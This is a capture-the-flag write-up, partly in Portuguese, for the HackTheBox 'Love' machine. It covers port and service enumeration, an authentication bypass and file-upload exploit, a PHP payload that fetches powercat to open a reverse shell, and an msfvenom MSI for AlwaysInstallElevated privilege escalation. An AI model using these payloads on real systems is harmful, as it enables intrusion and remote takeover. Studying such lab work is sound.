Love
========================

# Enumeration

    sudo nmap_enum 10.10.10.239 | tee nmap_output.txt
 
 ![qownnotes-media-XWtDKZ](../../../media/qownnotes-media-XWtDKZ.png)

    sudo nmap -sU -p 53,161,111,137,139,500,2049 -Pn 10.10.10.239 | tee nmap_udp_output.txt

![qownnotes-media-kjbFEa](../../../media/qownnotes-media-kjbFEa.png)

    sudo nmap -T5 -Pn --script vuln -p 80,135,139,443,445,3306,5000,5985,5986,7680,47001  10.10.10.239

![qownnotes-media-DiPEOy](../../../media/qownnotes-media-DiPEOy.png)
![qownnotes-media-vWxrsU](../../../media/qownnotes-media-vWxrsU.png)
![qownnotes-media-SWVkbt](../../../media/qownnotes-media-SWVkbt.png)

    sudo nmap -p- -Pn -T5 -n 10.10.10.239 | tee nmap_fullportstcp_output.txt

![qownnotes-media-WwvrPw](../../../media/qownnotes-media-WwvrPw.png)

Servicos
[HTTP](Love.md#HTTP)
[RPC](Love.md#RPC)
[SMB](Love.md#SMB)
MYSQL - Nao cheguei a testar


## HTTP

    gobuster dir -u http://10.10.10.239 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x "txt,html,php" -k -t 16 -o "tcp_port_protocol_medium_gobuster.txt"

    gobuster dir -u https://10.10.10.239 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k -t 16 -o "tcp_port_443_protocol_medium_gobuster.txt"


    firefox http://love.htb

![qownnotes-media-subdJa](../../../media/qownnotes-media-subdJa.png)

    searchsploit voting system

![qownnotes-media-TJINFA](../../../media/qownnotes-media-TJINFA.png)
  
Daqui em diante foi questao de achar um exploit funcional. Prosseguimos para a [Exploracao](Love.md#Exploitation)

## SMB

    smbclient -L //10.10.10.239
    
    smbclient -L //10.10.10.239 -U '' -N
    
    smbclient -L //10.10.10.239 -U ''
    
    enum4linux -a 10.10.10.239
 
 ![qownnotes-media-vIXCRV](../../../media/qownnotes-media-vIXCRV.png)


## RPC
    
    rpcclient -N -U '' 10.10.10.239
    
    enum4linux -a 10.10.10.239

![qownnotes-media-ASjgUv](../../../media/qownnotes-media-ASjgUv.png)

![qownnotes-media-MEOhag](../../../media/qownnotes-media-MEOhag.png)

# Exploitation

Primeiro o bypass da autenticacao:

    searchsploit -x php/webapps/49843.txt

![qownnotes-media-LgSCvh](../../../media/qownnotes-media-LgSCvh.png)

Informei as credenciais abaixo para entrar no sistema e funcionou.

potter
password

Proximo passo e utilizar do exploit de upload de arquivo:

    searchsploit -x php/webapps/49445.py

![qownnotes-media-RmfVfX](../../../media/qownnotes-media-RmfVfX.png)


![qownnotes-media-sugQhq](../../../media/qownnotes-media-sugQhq.png)

Com base nisso, eu subi uma shell reversa no servidor com o seguinte payload:

    <?php system("powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.5/powercat.ps1');powercat -c 10.10.14.5 -p 8082 -e powershell\""); ?>
    
![qownnotes-media-dNLOYr](../../../media/qownnotes-media-dNLOYr.png)


<http://love.htb/images/shell2.php>

    python -m http.server 80 --directory ~/owncloud/Area_de_trabalho/tools/windows/5-lateral_movement/powercat

![qownnotes-media-xnEBqA](../../../media/qownnotes-media-xnEBqA.png)

![qownnotes-media-mxjZbI](../../../media/qownnotes-media-mxjZbI.png)

# PrivEsc


#### PowerUp.ps1
    (new-object net.webclient).downloadfile('http://<hostname>/PowerUp.ps1', 'c:\temp\pu.ps1')
    . ./pu.ps1
    invoke-allchecks
    
##### AlwaysInstallElevated

![qownnotes-media-OcpDzT](../../../media/qownnotes-media-OcpDzT.png)

    msfvenom -p windows/shell_reverse_tcp -f msi LHOST=10.10.14.5 LPORT=8084 > shell.msi
    
    copy \\10.10.14.5\smb\shell.msi shell.msi
    msiexec /quiet /qn /i shell.msi

![qownnotes-media-xGOiSx](../../../media/qownnotes-media-xGOiSx.png)
